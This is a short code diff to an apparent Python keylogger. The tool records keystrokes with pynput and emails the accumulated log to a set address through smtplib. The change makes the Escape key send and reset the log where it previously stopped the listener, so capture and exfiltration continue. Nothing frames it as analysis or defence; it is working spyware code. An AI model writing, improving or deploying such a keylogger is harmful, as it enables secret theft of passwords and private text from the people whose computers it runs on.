@@ -1,4 +1,3 @@
-import getpass
 import smtplib
 from pynput.keyboard import Key, Listener
 
@@ -36,8 +35,9 @@ def on_press(key):
             char = char[1:-1]
             word = word+char
     if key == Key.esc:
-        return False
-    
+        send_log()
+        full_log = ""
+        
 def send_log():
     #server or cloud IAM instead#
     server.sendmail(sender_email, reciever_email, full_log)
